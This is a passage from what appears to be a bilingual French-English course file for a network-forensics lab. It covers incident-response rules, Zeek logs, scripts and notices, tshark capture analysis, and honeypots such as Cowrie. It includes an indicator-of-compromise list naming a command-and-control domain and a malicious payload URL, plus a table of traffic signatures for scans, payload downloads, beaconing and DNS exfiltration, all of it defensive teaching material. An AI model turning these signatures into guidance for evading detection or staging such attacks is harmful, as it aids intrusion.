  (`sha256sum`), la vérifier avant toute analyse (`sha256sum -c`) ; une empreinte qui change désigne
  une preuve altérée. Noter qui a eu la preuve en main, et quand (la **chaîne de possession**) ;
- **horodater en UTC**, et vérifier que les horloges étaient synchronisées (NTP) : corréler des
  journaux dont les horloges divergent mène à de fausses conclusions ;
- **noter chaque étape** (les commandes et leurs résultats) : l'analyse doit être reproductible ;
- construire une **chronologie** (*timeline*) : la liste datée des événements, de la première trace de
  l'attaquant à la dernière ;
- en tirer des **indicateurs de compromission** (*IOC*) : adresses, noms de domaine, URL, empreintes de
  fichiers, à rechercher ailleurs et à partager (section @@ref:intel@@).
""": """

The NIST SP 800-61 guide divides incident response into phases: **preparation** (sensors, logs,
procedures), **detection and analysis**, **containment**, **eradication** and **recovery**, then
**lessons learned**. This lab deals mostly with detection and analysis: establishing what happened,
when, from where, and what was affected.

The rules of an investigation (*forensics*):

- **never work on the original**: copy the evidence, compute its hash when collecting it
  (`sha256sum`), check it before any analysis (`sha256sum -c`); a hash that changes points to tampered
  evidence. Record who had the evidence in hand, and when (the **chain of custody**);
- **timestamp in UTC**, and check that the clocks were synchronised (NTP): correlating logs whose clocks
  drift apart leads to false conclusions;
- **record every step** (the commands and their results): the analysis must be reproducible;
- build a **timeline**: the dated list of the events, from the attacker's first trace to the last
  one;
- derive **indicators of compromise** (*IOC*) from it: addresses, domain names, URLs, file hashes, to
  look for elsewhere and to share (section @@ref:intel@@).
""",
        "Zeek": "Zeek",
        """

**Zeek** (anciennement Bro) est un moniteur de sécurité réseau libre. Il ne compare pas seulement le
trafic à des signatures : il **analyse les protocoles** et décrit chaque échange dans des **journaux**
structurés. Deux couches :

1. un **moteur d'événements** (en C++) capture les paquets, reconstitue les connexions et les flux TCP,
   reconnaît les protocoles (DNS, HTTP, TLS, SSH, SMB...) quel que soit le port, et produit des
   **événements** : `new_connection`, `dns_request`, `http_request`, `http_reply`,
   `connection_state_remove`...
2. des **scripts**, écrits dans le langage de Zeek, réagissent à ces événements : ceux qui sont fournis
   écrivent les journaux, d'autres détectent (scans, force brute SSH, injections SQL) et lèvent des
   **notices** (section @@ref:notice@@) ; on y ajoute les siens (section @@ref:scripting@@).

Zeek analyse une interface en direct (`zeek -i eth1 local`) ou une capture (`zeek -r capture.pcap`) :
la même analyse, ce qui en fait un outil d'investigation autant que de supervision. Zeek ne bloque
rien : c'est un outil de **visibilité**. D'une session chiffrée (HTTPS, SSH), il ne voit que les
métadonnées : le nom du serveur (SNI), le certificat, les versions, les volumes et les durées.
""": """

**Zeek** (formerly Bro) is a free network security monitor. It does not merely compare the traffic with
signatures: it **analyses the protocols** and describes each exchange in structured **logs**. Two
layers:

1. an **event engine** (in C++) captures the packets, reassembles the connections and the TCP streams,
   recognises the protocols (DNS, HTTP, TLS, SSH, SMB...) whatever the port, and produces
   **events**: `new_connection`, `dns_request`, `http_request`, `http_reply`,
   `connection_state_remove`...
2. **scripts**, written in the Zeek language, react to these events: the bundled ones write the logs,
   others detect (scans, SSH brute force, SQL injections) and raise **notices** (section
   @@ref:notice@@); you add your own (section @@ref:scripting@@).

Zeek analyses a live interface (`zeek -i eth1 local`) or a capture (`zeek -r capture.pcap`): the same
analysis, which makes it an investigation tool as much as a monitoring tool. Zeek blocks nothing: it is
a **visibility** tool. Of an encrypted session (HTTPS, SSH), it only sees the metadata: the server name
(SNI), the certificate, the versions, the volumes and the durations.
""",
        "Les journaux de Zeek": "The Zeek logs",
        """

Zeek écrit un fichier par type d'activité, une ligne par transaction : dans le répertoire courant pour
`zeek -r`, dans `/opt/zeek/logs/current/` pour une sonde en service (les journaux des heures passées sont
archivés, compressés, dans `/opt/zeek/logs/AAAA-MM-JJ/`).

| journal | une ligne par... | champs utiles |
|---------|------------------|---------------|
| `conn.log` | connexion TCP, UDP, ICMP | `id.orig_h`, `id.orig_p`, `id.resp_h`, `id.resp_p`, `proto`, `service`, `duration`, `orig_bytes`, `resp_bytes`, `conn_state`, `history`, `local_orig`, `local_resp` |
| `dns.log` | requête DNS | `query`, `qtype_name`, `rcode_name`, `answers` |
| `http.log` | requête HTTP | `method`, `host`, `uri`, `user_agent`, `status_code`, `resp_fuids` |
| `files.log` | fichier transféré | `fuid`, `mime_type`, `filename`, `md5`, `sha1`, `sha256` |
| `ssl.log` | session TLS | `server_name` (SNI), `version`, `cipher` |
| `ssh.log` | session SSH | `client`, `server`, `auth_success` (une estimation) |
| `notice.log` | notice d'un script | `note`, `msg`, `src`, `sub` |
| `intel.log` | indicateur reconnu | `seen.indicator`, `seen.where` |
| `weird.log` | anomalie de protocole | `name` |

Chaque connexion reçoit un identifiant unique, le **`uid`** (`CHhAvVGS1DHFjwGM9`), repris par toutes les
lignes qui la concernent : la ligne de `conn.log`, les requêtes de `http.log`, les fichiers de `files.log`
se relient par lui. Le **`community_id`** (`1:LQU9qZlK+B5F3KDmev6m5PMibrg=`, chargé par
`@load policy/protocols/conn/community-id-logging`) est un hachage du quintuplet (adresses, ports,
protocole) que Suricata et d'autres outils calculent aussi : il relie les journaux d'outils différents.

`conn_state` résume le déroulement d'une connexion TCP :

| `conn_state` | signification |
|--------------|---------------|
| `S0` | un SYN sans réponse (port filtré) |
| `REJ` | un SYN refusé par un RST (port fermé) |
| `S1` | établie, pas encore terminée |
| `SF` | établie et terminée normalement |
| `RSTO` / `RSTR` | interrompue par un RST de l'origine / du répondeur |
| `OTH` | début de connexion non vu |

et `history` en détaille les étapes, une lettre par événement, majuscule pour l'origine et minuscule
pour le répondeur : `S` SYN, `h` SYN-ACK, `A` ACK, `D` données, `F` FIN, `R` RST. `ShADadFf` est une
connexion complète, `Sr` un port fermé ; un SYN-ACK suivi d'un RST de l'origine (`ShR`) est la
signature d'un scan SYN (`nmap -sS`).
""": """

Zeek writes one file per type of activity, one line per transaction: in the current directory for
`zeek -r`, in `/opt/zeek/logs/current/` for a running sensor (the logs of past hours are archived,
compressed, in `/opt/zeek/logs/YYYY-MM-DD/`).

| log | one line per... | useful fields |
|-----|-----------------|---------------|
| `conn.log` | TCP, UDP, ICMP connection | `id.orig_h`, `id.orig_p`, `id.resp_h`, `id.resp_p`, `proto`, `service`, `duration`, `orig_bytes`, `resp_bytes`, `conn_state`, `history`, `local_orig`, `local_resp` |
| `dns.log` | DNS query | `query`, `qtype_name`, `rcode_name`, `answers` |
| `http.log` | HTTP request | `method`, `host`, `uri`, `user_agent`, `status_code`, `resp_fuids` |
| `files.log` | transferred file | `fuid`, `mime_type`, `filename`, `md5`, `sha1`, `sha256` |
| `ssl.log` | TLS session | `server_name` (SNI), `version`, `cipher` |
| `ssh.log` | SSH session | `client`, `server`, `auth_success` (an estimate) |
| `notice.log` | notice raised by a script | `note`, `msg`, `src`, `sub` |
| `intel.log` | indicator seen | `seen.indicator`, `seen.where` |
| `weird.log` | protocol anomaly | `name` |

Each connection gets a unique identifier, the **`uid`** (`CHhAvVGS1DHFjwGM9`), repeated by every line
about it: the line of `conn.log`, the requests of `http.log`, the files of `files.log` are linked by it.
The **`community_id`** (`1:LQU9qZlK+B5F3KDmev6m5PMibrg=`, loaded by
`@load policy/protocols/conn/community-id-logging`) is a hash of the 5-tuple (addresses, ports,
protocol) that Suricata and other tools compute too: it links the logs of different tools.

`conn_state` sums up how a TCP connection went:

| `conn_state` | meaning |
|--------------|---------|
| `S0` | a SYN without an answer (filtered port) |
| `REJ` | a SYN refused by a RST (closed port) |
| `S1` | established, not yet finished |
| `SF` | established and closed normally |
| `RSTO` / `RSTR` | aborted by a RST from the originator / the responder |
| `OTH` | start of the connection not seen |

and `history` details its steps, one letter per event, upper case for the originator and lower case for
the responder: `S` SYN, `h` SYN-ACK, `A` ACK, `D` data, `F` FIN, `R` RST. `ShADadFf` is a complete
connection, `Sr` a closed port; a SYN-ACK followed by a RST from the originator (`ShR`) is the signature
of a SYN scan (`nmap -sS`).
""",
        "Mettre une sonde en service : zeekctl": "Running a sensor: zeekctl",
        """

Sur une sonde, Zeek est piloté par **`zeekctl`**, configuré dans `/opt/zeek/etc/` :

- `node.cfg` : les processus de Zeek. Une sonde autonome :

```
[zeek]
type=standalone
host=localhost
interface=eth1
```

  (pour un gros débit, un *cluster* : un manager, un proxy et plusieurs *workers* qui se partagent le
  trafic) ;
- `networks.cfg` : les **réseaux locaux**, un par ligne (`10.1.2.0/24   DMZ`). Zeek en déduit les champs
  `local_orig` et `local_resp` de `conn.log`, donc le sens de chaque connexion (entrante, sortante,
  interne), et plusieurs scripts s'en servent (`known-hosts`, la détection des scans...). Attention :
  Zeek tient aussi pour locales, par défaut, toutes les adresses de `Site::private_address_space` (les
  réseaux privés de la RFC 1918, mais aussi 100.64.0.0/10, 198.18.0.0/15, les plages de documentation...) ;
  pour que seul `networks.cfg` compte, `redef Site::private_address_space_is_local = F;` dans
  `local.zeek` ;
- `zeekctl.cfg` : les répertoires, la rotation des journaux (`LogRotationInterval`, une heure).

La **politique du site** est `/opt/zeek/share/zeek/site/local.zeek` : les scripts chargés (`@load`) et les
réglages (`redef`). Pour des journaux en **JSON** plutôt qu'en colonnes séparées par des tabulations,
on y ajoute :

```
@load policy/tuning/json-logs
```

| commande | effet |
|----------|-------|
| `zeekctl check` | vérifie la configuration et les scripts |
| `zeekctl deploy` | installe la configuration et (re)démarre Zeek : après **chaque** modification |
| `zeekctl status` | l'état des processus |
| `zeekctl stop` | arrête Zeek |
| `zeekctl diag` | le diagnostic d'un processus qui ne démarre pas |

Une carte réseau calcule souvent elle-même les sommes de contrôle (*checksum offloading*) : une capture
faite sur la machine émettrice montre alors des sommes fausses, et Zeek ignore ces paquets (`weird.log` :
`bad_TCP_checksum`). Pour lire une telle capture : `zeek -C -r capture.pcap` (ou
`redef ignore_checksums = T;`).
""": """

On a sensor, Zeek is driven by **`zeekctl`**, configured in `/opt/zeek/etc/`:

- `node.cfg`: the Zeek processes. A standalone sensor:

```
[zeek]
type=standalone
host=localhost
interface=eth1
```

  (for a high throughput, a *cluster*: a manager, a proxy and several *workers* that share the
  traffic);
- `networks.cfg`: the **local networks**, one per line (`10.1.2.0/24   DMZ`). Zeek derives from them the
  fields `local_orig` and `local_resp` of `conn.log`, hence the direction of each connection (inbound,
  outbound, internal), and several scripts use them (`known-hosts`, scan detection...). Beware: by
  default Zeek also considers local all the addresses of `Site::private_address_space` (the private
  networks of RFC 1918, but also 100.64.0.0/10, 198.18.0.0/15, the documentation ranges...); for
  `networks.cfg` alone to count, `redef Site::private_address_space_is_local = F;` in
  `local.zeek`;
- `zeekctl.cfg`: the directories, the log rotation (`LogRotationInterval`, one hour).

The **site policy** is `/opt/zeek/share/zeek/site/local.zeek`: the loaded scripts (`@load`) and the
settings (`redef`). For logs in **JSON** rather than in tab-separated columns, add to it:

```
@load policy/tuning/json-logs
```

| command | effect |
|---------|--------|
| `zeekctl check` | checks the configuration and the scripts |
| `zeekctl deploy` | installs the configuration and (re)starts Zeek: after **every** change |
| `zeekctl status` | the state of the processes |
| `zeekctl stop` | stops Zeek |
| `zeekctl diag` | the diagnosis of a process that does not start |

A network card often computes the checksums itself (*checksum offloading*): a capture made on the
sending machine then shows wrong checksums, and Zeek ignores these packets (`weird.log`:
`bad_TCP_checksum`). To read such a capture: `zeek -C -r capture.pcap` (or
`redef ignore_checksums = T;`).
""",
        "Lire les journaux : zeek-cut et jq": "Reading the logs: zeek-cut and jq",
        """

Au format TSV, `zeek-cut` extrait des colonnes par leur nom (il lit l'en-tête `#fields`) :

```
zeek-cut id.orig_h id.resp_h id.resp_p service conn_state < conn.log
zeek-cut -u ts query answers < dns.log
```

(`-u` : les dates en UTC lisibles ; `-d` en heure locale). Au format JSON, une ligne est un objet, et
`jq` sélectionne, transforme et compte :

```
jq -c '[.ts, ."id.orig_h", .host, .uri]' http.log
jq -r 'select(.status_code == 404) | ."id.orig_h"' http.log | sort | uniq -c | sort -rn
jq -r 'select(.conn_state == "REJ") | ."id.resp_p"' conn.log | sort -n | uniq
jq -r 'select(.query | endswith(".example")) | .query' dns.log
```

Un nom qui contient un point s'écrit entre guillemets : `."id.orig_h"`. `jq -s` (*slurp*) lit tout le
fichier comme un tableau (pour grouper : `group_by`, `length`). `date -u -d @1764000000` convertit un `ts`
en date.
""": """

In TSV format, `zeek-cut` extracts columns by their name (it reads the `#fields` header):

```
zeek-cut id.orig_h id.resp_h id.resp_p service conn_state < conn.log
zeek-cut -u ts query answers < dns.log
```

(`-u`: readable UTC dates; `-d` in local time). In JSON format, a line is an object, and `jq` selects,
transforms and counts:

```
jq -c '[.ts, ."id.orig_h", .host, .uri]' http.log
jq -r 'select(.status_code == 404) | ."id.orig_h"' http.log | sort | uniq -c | sort -rn
jq -r 'select(.conn_state == "REJ") | ."id.resp_p"' conn.log | sort -n | uniq
jq -r 'select(.query | endswith(".example")) | .query' dns.log
```

A name that contains a dot is written in quotes: `."id.orig_h"`. `jq -s` (*slurp*) reads the whole file
as an array (to group: `group_by`, `length`). `date -u -d @1764000000` converts a `ts` into a date.
""",
        "Écrire un script Zeek": "Writing a Zeek script",
        """

Un script déclare des **gestionnaires d'événements**. Les types usuels : `addr` (`10.1.2.3`), `subnet`
(`10.1.2.0/24`), `port` (`80/tcp`), `count`, `int`, `string`, `bool` (`T` / `F`), `time`, `interval`
(`30sec`, `2min`), et les conteneurs `set[addr]`, `table[addr] of count`, `vector of string`, `record`.
Une connexion est un `record` de type `connection` : `c$id$orig_h`, `c$id$orig_p`, `c$id$resp_h`,
`c$id$resp_p`, `c$uid`.

```
module DEMO;

export {
    const watched = 10.1.2.3 &redef;      # une constante qu'un redef peut changer
}

global per_client: table[addr] of count &default=0 &create_expire=5min;

event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
    {
    if ( c$id$resp_h != watched )
        return;
    per_client[c$id$orig_h] += 1;
    print fmt("%s -> %s : %s (%d)", c$id$orig_h, c$id$resp_h, original_URI, per_client[c$id$orig_h]);
    }
```

Quelques événements : `zeek_init()` (au démarrage), `new_connection(c: connection)` (le premier paquet
d'une connexion, TCP, UDP ou ICMP : `c$id$orig_h` est celui qui l'a ouverte),
`connection_established(c: connection)` (une poignée de main TCP complète),
`http_reply(c: connection, version: string, code: count, reason: string)`,
`dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)`,
`connection_state_remove(c: connection)` (la connexion oubliée).

Les attributs d'une table règlent la **durée de vie** de ses entrées : `&create_expire = 5min` (5 minutes
après sa **création** : une fenêtre qui commence au premier événement), `&write_expire` (après la
dernière écriture), `&read_expire` (après la dernière lecture) ; `&default = 0` donne la valeur d'une
clé absente. Une adresse se teste par `if ( a in 10.1.2.0/24 )`, `Site::is_local_addr(a)`.

Pour essayer un script : dans un répertoire vide, `zeek -C -r capture.pcap mon-script.zeek` ; `print`
écrit dans le terminal, une erreur est signalée avec son numéro de ligne (`zeek --parse-only script.zeek`
vérifie la syntaxe seule).
""": """

A script declares **event handlers**. The usual types: `addr` (`10.1.2.3`), `subnet` (`10.1.2.0/24`),
`port` (`80/tcp`), `count`, `int`, `string`, `bool` (`T` / `F`), `time`, `interval` (`30sec`, `2min`),
and the containers `set[addr]`, `table[addr] of count`, `vector of string`, `record`. A connection is a
`record` of type `connection`: `c$id$orig_h`, `c$id$orig_p`, `c$id$resp_h`, `c$id$resp_p`, `c$uid`.

```
module DEMO;

export {
    const watched = 10.1.2.3 &redef;      # a constant that a redef can change
}

global per_client: table[addr] of count &default=0 &create_expire=5min;

event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
    {
    if ( c$id$resp_h != watched )
        return;
    per_client[c$id$orig_h] += 1;
    print fmt("%s -> %s : %s (%d)", c$id$orig_h, c$id$resp_h, original_URI, per_client[c$id$orig_h]);
    }
```

A few events: `zeek_init()` (at startup), `new_connection(c: connection)` (the first packet of a
connection, TCP, UDP or ICMP: `c$id$orig_h` is the side that opened it),
`connection_established(c: connection)` (a complete TCP handshake),
`http_reply(c: connection, version: string, code: count, reason: string)`,
`dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)`,
`connection_state_remove(c: connection)` (the connection is forgotten).

The attributes of a table set the **lifetime** of its entries: `&create_expire = 5min` (5 minutes after
its **creation**: a window that starts at the first event), `&write_expire` (after the last write),
`&read_expire` (after the last read); `&default = 0` gives the value of a missing key. An address is
tested with `if ( a in 10.1.2.0/24 )`, `Site::is_local_addr(a)`.

To try a script: in an empty directory, `zeek -C -r capture.pcap my-script.zeek`; `print` writes to the
terminal, an error is reported with its line number (`zeek --parse-only script.zeek` checks the syntax
alone).
""",
        "Les notices": "Notices",
        """

Un script signale ce qu'il juge important en levant une **notice**, écrite dans `notice.log` :

```
module DEMO;

export {
    redef enum Notice::Type += { Big_Upload };     # le type DEMO::Big_Upload
}

event connection_state_remove(c: connection)
    {
    if ( c$orig?$size && c$orig$size > 10000000 )
        NOTICE([$note=Big_Upload, $conn=c,
                $msg=fmt("%s a envoyé %d octets", c$id$orig_h, c$orig$size),
                $identifier=cat(c$id$orig_h)]);
    }
```

- `$note` : le type, déclaré par `redef enum Notice::Type += { ... };` dans le bloc `export` d'un
  `module` : il s'appelle alors `Module::Nom` (`DEMO::Big_Upload`) ;
- `$msg` : le texte lisible, `$sub` un complément ;
- `$conn = c` remplit l'`uid` et les champs `id.orig_h`, `id.orig_p`, `id.resp_h`, `id.resp_p` de la
  notice ; sans connexion, `$src` donne une adresse (le champ `src`) ;
- `$identifier` (et `$suppress_for`, une heure par défaut) : deux notices de même type et de même
  identifiant dans ce délai n'en font qu'une.

Le crochet `hook Notice::policy` ajoute des actions (courriel, `Notice::ACTION_ALARM`...).
""": """

A script reports what it considers important by raising a **notice**, written to `notice.log`:

```
module DEMO;

export {
    redef enum Notice::Type += { Big_Upload };     # the type DEMO::Big_Upload
}

event connection_state_remove(c: connection)
    {
    if ( c$orig?$size && c$orig$size > 10000000 )
        NOTICE([$note=Big_Upload, $conn=c,
                $msg=fmt("%s sent %d bytes", c$id$orig_h, c$orig$size),
                $identifier=cat(c$id$orig_h)]);
    }
```

- `$note`: the type, declared by `redef enum Notice::Type += { ... };` in the `export` block of a
  `module`: it is then called `Module::Name` (`DEMO::Big_Upload`);
- `$msg`: the readable text, `$sub` some additional detail;
- `$conn = c` fills in the `uid` and the fields `id.orig_h`, `id.orig_p`, `id.resp_h`, `id.resp_p` of the
  notice; without a connection, `$src` gives an address (the field `src`);
- `$identifier` (and `$suppress_for`, one hour by default): two notices of the same type and with the
  same identifier within that delay count as one.

The hook `hook Notice::policy` adds actions (email, `Notice::ACTION_ALARM`...).
""",
        "Le renseignement sur les menaces : le cadre Intel": "Threat intelligence: the Intel framework",
        """

Les indicateurs de compromission partagés (par un CERT, une plate-forme MISP, un flux commercial) se
donnent à Zeek dans un fichier texte : une ligne d'en-tête `#fields`, puis un indicateur par ligne, les
champs séparés par **une tabulation** (jamais des espaces : la cause la plus fréquente d'un fichier
ignoré, signalée dans `reporter.log`) :

```
#fields	indicator	indicator_type	meta.source	meta.desc
203.0.113.66	Intel::ADDR	CERT-X	scanner connu
evil.example	Intel::DOMAIN	CERT-X	domaine de commande et contrôle
www.example.org/payload.exe	Intel::URL	CERT-X	charge malveillante
```

Les types : `Intel::ADDR`, `Intel::SUBNET`, `Intel::DOMAIN`, `Intel::URL` (sans `http://` : l'hôte suivi
du chemin, comme `Host` + l'URI de la requête), `Intel::FILE_HASH`, `Intel::EMAIL`, `Intel::USER_AGENT`,
`Intel::CERT_HASH`... Le chargement, dans `local.zeek` :

```
@load frameworks/intel/seen
redef Intel::read_files += { "/opt/zeek/share/zeek/site/intel.dat" };
```

`frameworks/intel/seen` présente au cadre Intel ce que Zeek voit : les adresses des connexions, les
requêtes DNS, les URL et en-têtes HTTP, les empreintes des fichiers, les certificats... Une
correspondance est écrite dans `intel.log` (`seen.indicator`, et `seen.where` : `Conn::IN_ORIG`,
`DNS::IN_REQUEST`, `HTTP::IN_URL`...). Le fichier est relu quand il change : la sonde n'a pas besoin
d'être redémarrée. En lecture d'une capture, en revanche, Zeek peut avoir fini avant d'avoir lu le
fichier (il le lit en parallèle) : `zeek --pseudo-realtime=1 -r capture.pcap` rejoue la capture à sa
vitesse réelle.
""": """

Shared indicators of compromise (from a CERT, a MISP platform, a commercial feed) are given to Zeek in a
text file: a `#fields` header line, then one indicator per line, the fields separated by **a tab**
(never spaces: the most frequent cause of an ignored file, reported in `reporter.log`):

```
#fields	indicator	indicator_type	meta.source	meta.desc
203.0.113.66	Intel::ADDR	CERT-X	known scanner
evil.example	Intel::DOMAIN	CERT-X	command and control domain
www.example.org/payload.exe	Intel::URL	CERT-X	malicious payload
```

The types: `Intel::ADDR`, `Intel::SUBNET`, `Intel::DOMAIN`, `Intel::URL` (without `http://`: the host
followed by the path, like `Host` + the URI of the request), `Intel::FILE_HASH`, `Intel::EMAIL`,
`Intel::USER_AGENT`, `Intel::CERT_HASH`... Loading it, in `local.zeek`:

```
@load frameworks/intel/seen
redef Intel::read_files += { "/opt/zeek/share/zeek/site/intel.dat" };
```

`frameworks/intel/seen` hands the Intel framework what Zeek sees: the addresses of the connections, the
DNS queries, the HTTP URLs and headers, the file hashes, the certificates... A match is written to
`intel.log` (`seen.indicator`, and `seen.where`: `Conn::IN_ORIG`, `DNS::IN_REQUEST`, `HTTP::IN_URL`...).
The file is read again when it changes: the sensor does not need to be restarted. When reading a
capture, on the other hand, Zeek may have finished before it has read the file (it reads it in
parallel): `zeek --pseudo-realtime=1 -r capture.pcap` replays the capture at its real speed.
""",
        "Analyser une capture": "Analysing a capture",
        """

Une méthode :

1. **intégrité** : `sha256sum -c incident.pcap.sha256`, puis travailler sur une copie ;
2. **vue d'ensemble** : `capinfos incident.pcap` (dates, durée, nombre de paquets),
   `tshark -r incident.pcap -q -z conv,ip` (les conversations), `-z io,phs` (les protocoles) ;
3. **journaux** : `mkdir zeek && cd zeek && zeek -C -r ../incident.pcap local`, puis les questions par
   `zeek-cut` ou `jq` : qui parle le plus, à qui, quels noms sont demandés, quels fichiers passent
   (`local` charge la politique du site : les empreintes des fichiers, entre autres) ;
4. **zoom** sur ce qui intrigue, avec `tshark` et un filtre d'affichage, ou Wireshark (*Follow TCP
   Stream*).

| besoin | commande |
|--------|----------|
| des champs choisis | `tshark -r f.pcap -Y 'http.request' -T fields -e frame.time_epoch -e ip.src -e http.host -e http.request.uri` |
| le contenu d'un flux TCP | `tshark -r f.pcap -q -z follow,tcp,ascii,5` (le flux n° 5 : champ `tcp.stream`) |
| les statistiques HTTP | `tshark -r f.pcap -q -z http,tree` |
| les noms demandés | `tshark -r f.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name` |
| les champs des formulaires envoyés | `tshark -r f.pcap -Y urlencoded-form -T fields -e urlencoded-form.key -e urlencoded-form.value` |
| extraire les fichiers | `tshark -r f.pcap --export-objects http,/tmp/objets` |

Zeek extrait aussi les fichiers (`@load frameworks/files/extract-all-files`, dans `extract_files/`), et
`files.log` donne leurs empreintes (`frameworks/files/hash-all-files`, chargé par `local`). Un formulaire
envoie ses champs encodés (`application/x-www-form-urlencoded`) : `%21` est `!`, `+` une espace ;
tshark les décode (`urlencoded-form.value`), le contenu brut d'un flux les montre tels quels.
""": """

A method:

1. **integrity**: `sha256sum -c incident.pcap.sha256`, then work on a copy;
2. **overview**: `capinfos incident.pcap` (dates, duration, number of packets),
   `tshark -r incident.pcap -q -z conv,ip` (the conversations), `-z io,phs` (the protocols);
3. **logs**: `mkdir zeek && cd zeek && zeek -C -r ../incident.pcap local`, then the questions through
   `zeek-cut` or `jq`: who talks the most, to whom, which names are queried, which files go through
   (`local` loads the site policy: the file hashes, among other things);
4. **zoom** in on what looks odd, with `tshark` and a display filter, or Wireshark (*Follow TCP
   Stream*).

| need | command |
|------|---------|
| chosen fields | `tshark -r f.pcap -Y 'http.request' -T fields -e frame.time_epoch -e ip.src -e http.host -e http.request.uri` |
| the content of a TCP stream | `tshark -r f.pcap -q -z follow,tcp,ascii,5` (stream no. 5: field `tcp.stream`) |
| the HTTP statistics | `tshark -r f.pcap -q -z http,tree` |
| the queried names | `tshark -r f.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name` |
| the fields of the submitted forms | `tshark -r f.pcap -Y urlencoded-form -T fields -e urlencoded-form.key -e urlencoded-form.value` |
| extract the files | `tshark -r f.pcap --export-objects http,/tmp/objets` |

Zeek extracts the files too (`@load frameworks/files/extract-all-files`, into `extract_files/`), and
`files.log` gives their hashes (`frameworks/files/hash-all-files`, loaded by `local`). A form sends its
fields encoded (`application/x-www-form-urlencoded`): `%21` is `!`, `+` a space; tshark decodes them
(`urlencoded-form.value`), the raw content of a stream shows them as they are.
""",
        "Reconnaître une attaque dans le trafic": "Recognising an attack in the traffic",
        """

| activité | ce qu'on voit |
|----------|---------------|
| **scan de ports** | une source, une cible (ou beaucoup), de nombreux ports en peu de temps ; `REJ` (fermé) ou `S0` (filtré) ; pour un port **ouvert**, un SYN-ACK suivi d'un RST de la source (`ShR`) |
| **recherche de mots de passe** | des requêtes répétées vers la même cible et le même service (`POST /login`, SSH), des réponses d'échec (`401`, ou `200` avec un message d'erreur), puis une réponse différente : le succès (`302`, un cookie) |
| **téléchargement d'une charge** | un `GET` d'un script ou d'un exécutable, souvent par un outil en ligne de commande (`Wget`, `curl`, `python-requests`) ; dans `files.log`, le type MIME et les empreintes |
| **balise de C2** (*beaconing*) | une machine interne qui contacte la même destination à **intervalle régulier** (parfois avec une petite gigue), de petites requêtes et réponses, un User-Agent incongru |
| **exfiltration par DNS** | des noms très longs, des sous-domaines tous différents sous un même domaine, un contenu à forte entropie (hexadécimal, base32, base64) : les données sont **dans les noms demandés**, les réponses importent peu (`NXDOMAIN`) |
| **mouvement latéral** | des connexions internes inhabituelles (SMB, RDP, SSH) depuis une machine compromise |

Pour mesurer un intervalle : les `ts` des requêtes, puis leurs différences successives
(`... | awk 'NR > 1 {print $1 - p} {p = $1}'`). Pour décoder de l'hexadécimal :
`echo 48656c6c6f | xxd -r -p`.
""": """

| activity | what you see |
|----------|--------------|
| **port scan** | one source, one target (or many), many ports in a short time; `REJ` (closed) or `S0` (filtered); for an **open** port, a SYN-ACK followed by a RST from the source (`ShR`) |
| **password guessing** | repeated requests to the same target and the same service (`POST /login`, SSH), failure answers (`401`, or `200` with an error message), then a different answer: the success (`302`, a cookie) |
| **payload download** | a `GET` of a script or an executable, often by a command-line tool (`Wget`, `curl`, `python-requests`); in `files.log`, the MIME type and the hashes |
| **C2 beacon** (*beaconing*) | an internal machine that contacts the same destination at a **regular interval** (sometimes with a little jitter), small requests and answers, an odd User-Agent |
| **DNS exfiltration** | very long names, subdomains that all differ under one domain, high-entropy content (hexadecimal, base32, base64): the data is **in the queried names**, the answers hardly matter (`NXDOMAIN`) |
| **lateral movement** | unusual internal connections (SMB, RDP, SSH) from a compromised machine |

To measure an interval: the `ts` of the requests, then their successive differences
(`... | awk 'NR > 1 {print $1 - p} {p = $1}'`). To decode hexadecimal:
`echo 48656c6c6f | xxd -r -p`.
""",
        "Les pots de miel": "Honeypots",
        """

Un **pot de miel** (*honeypot*) est un système **leurre**, sans usage légitime, offert aux attaquants
pour les observer. Puisque personne n'a de raison de s'y connecter, **toute connexion est suspecte** :
pas de faux positif, une alerte précoce (un attaquant qui explore le réseau interne y tombe), et des
journaux riches sur ses méthodes (les mots de passe essayés, les commandes, les logiciels téléchargés).

Trois niveaux d'**interaction** :

- **basse** : un service qui accepte la connexion et note qui frappe (une bannière, un port ouvert) ;
- **moyenne** : l'émulation d'un service et d'un système. **Cowrie** est un serveur SSH et un shell
  factices : l'attaquant croit taper des commandes, rien n'est réellement exécuté ;
- **haute** : un vrai système instrumenté : le plus réaliste, et le plus risqué.

Précautions :

- un pot de miel ne doit servir de **rebond** à personne : l'isoler (DMZ, VLAN), filtrer ses connexions
  sortantes et le surveiller ; un pot de miel qui ouvre lui-même une connexion est une alerte en soi ;
- son vrai accès d'administration passe par un autre port, ouvert au seul réseau des administrateurs ;
- le rendre **crédible** : un nom d'hôte, une bannière, un noyau, des fichiers plausibles ; un Cowrie
  laissé avec ses réglages par défaut (le nom `svr04`, sa bannière, son noyau) se reconnaît en une
  commande ;
- côté juridique, on n'observe que ses propres systèmes ; les journaux contiennent des données
  personnelles au sens du RGPD (des adresses IP) : durée de conservation et accès à définir. On ne
  « contre-attaque » jamais.

Exposé à Internet, un pot de miel étudie les attaques de masse ; placé à l'intérieur (DMZ, réseaux
internes), il sert de **détecteur d'intrusion**.
""": """

A **honeypot** is a **decoy** system, with no legitimate use, offered to attackers in order to observe
them. Since nobody has any reason to connect to it, **every connection is suspicious**: no false
positives, an early warning (an attacker exploring the internal network stumbles on it), and rich logs
on their methods (the passwords tried, the commands, the software downloaded).

Three levels of **interaction**:

- **low**: a service that accepts the connection and records who knocks (a banner, an open port);
- **medium**: the emulation of a service and of a system. **Cowrie** is a fake SSH server and shell:
  the attacker believes they are typing commands, nothing is really executed;
- **high**: a real, instrumented system: the most realistic, and the riskiest.

Precautions:

- a honeypot must not serve anyone as a **pivot**: isolate it (DMZ, VLAN), filter its outgoing
  connections and monitor it; a honeypot that opens a connection itself is an alert in its own right;
- its real administration access goes through another port, open to the administrators' network only;
- make it **credible**: a host name, a banner, a kernel, plausible files; a Cowrie left with its
  default settings (the name `svr04`, its banner, its kernel) is recognised with a single
  command;
- on the legal side, you only observe your own systems; the logs contain personal data within the
  meaning of the GDPR (IP addresses): retention period and access must be defined. You never
  "counter-attack".

Exposed to the Internet, a honeypot studies mass attacks; placed inside (DMZ, internal networks), it
serves as an **intrusion detector**.
""",
        "Cowrie": "Cowrie",
        """

**Cowrie** est un pot de miel SSH et Telnet à interaction moyenne, en Python. Il est installé ici dans
